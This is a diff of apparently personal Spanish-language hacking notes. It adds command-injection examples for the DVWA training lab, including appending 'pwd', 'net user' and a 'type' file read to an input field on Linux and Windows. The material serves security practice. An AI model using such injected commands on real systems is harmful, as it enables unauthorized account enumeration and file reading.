@@ -5,7 +5,16 @@ Tags: #Hacking #SQLI #MSSQL #SQLMap #BurpSuite  #Ñ
 ## Inyecciones DVWA
 
 ```bash 
-❯ input | pwd       # Mirar la ruta del directorio actual de trabajo. Pipe sirve para ejecutar un segundo comando si la primer parte es exitosa 
+http://IP:8080/DVWA/login.php       # Ruta por defecto al login en un DVWA
+```
+
+```bash 
+# Linux
+❯ input | pwd          # Mirar la ruta del directorio actual de trabajo. Pipe sirve para ejecutar un segundo comando si la primer parte es exitosa
+
+# Windows
+❯ input && net user    # Muestra las cuentas de usuarios en el sistema 
+❯ input && type C:\wamp64\www\DVWA\upload\file.txt   # Muestra el contenido del archivo 
 ```
 
 ## SQLMap 
